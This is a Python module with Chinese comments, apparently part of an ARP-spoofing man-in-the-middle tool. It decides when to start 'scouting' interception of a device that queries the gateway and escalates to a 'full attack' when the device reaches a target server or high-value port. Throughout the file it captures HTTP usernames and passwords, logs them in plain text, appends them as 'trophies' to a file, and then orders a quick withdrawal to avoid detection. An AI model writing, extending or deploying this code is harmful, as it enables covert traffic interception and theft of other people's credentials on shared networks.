"""
攻击协调器
==========
根据数据包分析结果制定攻击策略，管理攻击生命周期
"""

import logging
import time
import threading
from dataclasses import dataclass
from typing import Optional, Callable, Dict, Any
from state_cache import StateCache

@dataclass
class AttackDecision:
    """攻击决策"""
    action: str  # 'attack', 'restore', 'ignore'
    target_ip: str
    gateway_ip: str = ""
    target_mac: str = ""
    gateway_mac: str = ""
    duration: int = 45  # 攻击持续时间(秒)
    attack_type: str = "standard"  # 攻击类型
    reason: str = ""  # 决策原因

class AttackCoordinator:
    """攻击协调器"""
    
    def __init__(self, config, state_cache: StateCache):
        self.config = config
        self.state_cache = state_cache
        self.logger = logging.getLogger(__name__)
        self.command_sender = None
        
        # 统计信息
        self.stats = {
            'decisions_made': 0,
            'attacks_authorized': 0,
            'attacks_blocked': 0,
            'restores_initiated': 0
        }
        self.stats_lock = threading.Lock()
        
    def initialize(self, command_sender: Callable) -> bool:
        """初始化协调器"""
        self.command_sender = command_sender
        self.logger.info("Attack coordinator initialized")
        return True
        
    def make_decision(self, analysis_result) -> Optional[AttackDecision]:
        """根据分析结果制定攻击决策"""
        with self.stats_lock:
            self.stats['decisions_made'] += 1
            
        try:
            if analysis_result.packet_type == 'arp':
                return self._handle_arp_analysis(analysis_result)
            elif analysis_result.packet_type == 'http':
                return self._handle_http_analysis(analysis_result)
            else:
                return None
                
        except Exception as e:
            self.logger.error(f"Decision making error: {e}")
            return None
    
    def _handle_arp_analysis(self, analysis) -> Optional[AttackDecision]:
        """处理ARP分析结果 - 发起侦察窗口"""
        if not analysis.gateway_query:
            return None
            
        target_ip = analysis.source_ip
        
        # 检查是否应该攻击此目标
        if not self.state_cache.should_attack_target(target_ip):
            with self.stats_lock:
                self.stats['attacks_blocked'] += 1
                
            self.logger.debug(f"Attack blocked for {target_ip} (cache hit or active attack)")
            return AttackDecision(
                action='ignore',
                target_ip=target_ip,
                reason='blocked_by_cache'
            )
        
        # ★【核心修改】★ 启动侦察窗口，而非全面攻击
        with self.stats_lock:
            self.stats['attacks_authorized'] += 1
            
        # 获取目标MAC (从缓存或分析结果)
        target_mac = analysis.metadata.get('src_mac', '')
        if not target_mac:
            target_mac = self.state_cache.get_cached_mac(target_ip) or ''
        
        # ★【新策略】★ 创建侦察模式的攻击决策
        decision = AttackDecision(
            action='attack',
            target_ip=target_ip,
            gateway_ip=self.config.network.gateway_ip,
            target_mac=target_mac,
            gateway_mac='',  # 将在执行时获取
            duration=self.config.attack.strategy.scouting_duration,  # 使用侦察持续时间
            attack_type='scouting',  # 侦察模式
            reason='arp_gateway_query_for_scouting'
        )
        
        # 开始侦察会话跟踪
        self.state_cache.start_attack_session(
            target_ip, 
            decision.duration, 
            decision.attack_type
        )
        #🕵️可以换成这个表情如果喜欢的话
        self.logger.info(f"🔍 New device {target_ip} detected. Initiating {decision.duration}s 'scouting' MiTM.")
        return decision
    
    def _handle_http_analysis(self, analysis) -> Optional[AttackDecision]:
        """处理HTTP分析结果 - 价值判断与攻击升级"""
        target_ip = analysis.source_ip
        
        # 获取目标和端口信息
        dst_ip = analysis.metadata.get('dst_ip', '')
        dst_port = analysis.metadata.get('dst_port', 0)
        
        # ★【核心逻辑1】★ 检查是否为高价值事件
        is_high_value_event = self._is_high_value_event(dst_ip, dst_port)
        
        # ★【核心逻辑2】★ 获取当前攻击状态
        current_attack_info = self.state_cache.get_attack_info(target_ip)
        
        # ★【核心逻辑3】★ 如果处于侦察模式，且触发高价值事件，则升级攻击
        if is_high_value_event and current_attack_info and current_attack_info['attack_type'] == 'scouting':
            self.logger.info(f"🎯 High-value event from {target_ip} (port {dst_port})! Upgrading to full attack for {self.config.attack.strategy.full_attack_duration}s.")
            
            # 升级攻击会话
            self.state_cache.upgrade_attack_session(
                target_ip, 
                self.config.attack.strategy.full_attack_duration, 
                'full_attack'
            )
            
            # 发送攻击升级指令
            return AttackDecision(
                action='attack',
                target_ip=target_ip,
                gateway_ip=self.config.network.gateway_ip,
                duration=self.config.attack.strategy.full_attack_duration,
                attack_type='full_attack',
                reason='high_value_event_detected'
            )
        
        # ★【核心逻辑4】★ 凭据捕获处理（无论在哪种攻击模式下）
        if analysis.http_credentials:
            self.logger.info(f"🏆 Credentials captured from {target_ip}: "
                           f"{analysis.http_credentials['username']}:"
                           f"{analysis.http_credentials['password']}")
            
            # 保存凭据到文件
            self._save_credentials(target_ip, analysis.http_credentials, analysis.metadata)
            
            # 标记攻击成功
            self.state_cache.end_attack_session(target_ip, success=True)
            
            # 立即恢复网络
            return AttackDecision(
                action='restore',
                target_ip=target_ip,
                gateway_ip=self.config.network.gateway_ip,
                reason='credentials_captured'
            )
        
        # ★【核心逻辑5】★ 普通HTTP流量，记录但不做决策
        return AttackDecision(
            action='ignore',
            target_ip=target_ip,
            reason='http_traffic_logged'
        )
    
    def _is_high_value_event(self, dst_ip: str, dst_port: int) -> bool:
        """判断是否为高价值事件"""
        # 检查是否访问目标服务器
        if dst_ip == self.config.network.target_server:
            self.logger.debug(f"High-value server access detected: {dst_ip}")
            return True
        
        # 检查是否访问高价值端口
        if dst_port in self.config.attack.strategy.high_value_ports:
            self.logger.debug(f"High-value port access detected: {dst_port}")
            return True
        
        # ★【扩展】★ 检查其他高价值模式
        # 例如：特定域名、特定URL路径等
        # 这里可以根据实际需求扩展
            
        return False
    
    def _save_credentials(self, source_ip: str, credentials: Dict[str, str], metadata: Dict):
        """保存捕获的凭据并触发立即撤离"""
        try:
            # ★【强化防重复】★ 多层去重检查
            username = credentials.get('username', '')
            password = credentials.get('password', '')
            credential_key = f"{source_ip}:{username}:{password}"
            
            # 使用状态缓存检查是否已保存
            if self.state_cache.has_credentials_saved(credential_key):
                self.logger.debug(f"Credentials for {credential_key} already saved, skipping duplicate")
                return
            
            # ★【新增】★ 线程安全的重复检查
            with self.stats_lock:
                if hasattr(self, '_saved_credentials_cache'):
                    if credential_key in self._saved_credentials_cache:
                        self.logger.debug(f"Credentials {credential_key} already in processing cache")
                        return
                else:
                    self._saved_credentials_cache = set()
                
                # 标记正在处理
                self._saved_credentials_cache.add(credential_key)
            
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            
            # 格式化保存内容：IP,用户名,密码,时间 (保持原始4字段格式)
            log_entry = f"{source_ip},{username},{password},{timestamp}\n"
            
            # 保存到临时文件
            trophy_file = "temporary.txt"
            with open(trophy_file, "a", encoding="utf-8") as f:
                f.write(log_entry)
            
            # 标记已保存，防止重复
            self.state_cache.mark_credentials_saved(credential_key)
            
            self.logger.info(f"🏆 Credentials saved to {trophy_file}: {username}@{source_ip}")
            
            # 🚀 发送立即停止攻击命令 (一击脱离)
            stop_command = {
                'type': 'STOP_SPOOF',
                'target_ip': source_ip,
                'reason': 'credentials_captured'
            }
            
            if self.command_sender:
                self.command_sender(stop_command)
                self.logger.info(f"⚡ Immediate withdrawal triggered for {source_ip} - credentials captured!")
            
        except Exception as e:
            self.logger.error(f"Failed to save credentials: {e}")
            # 发生错误时从处理缓存中移除
            with self.stats_lock:
                if hasattr(self, '_saved_credentials_cache'):
                    self._saved_credentials_cache.discard(credential_key)
    
    def get_statistics(self) -> Dict[str, Any]:
        """获取协调器统计信息"""
        with self.stats_lock:
            stats = dict(self.stats)
        
        # 添加状态缓存统计
        cache_stats = self.state_cache.get_statistics()
        stats.update({
            'cache_' + k: v for k, v in cache_stats.items()
        })
        
        return stats
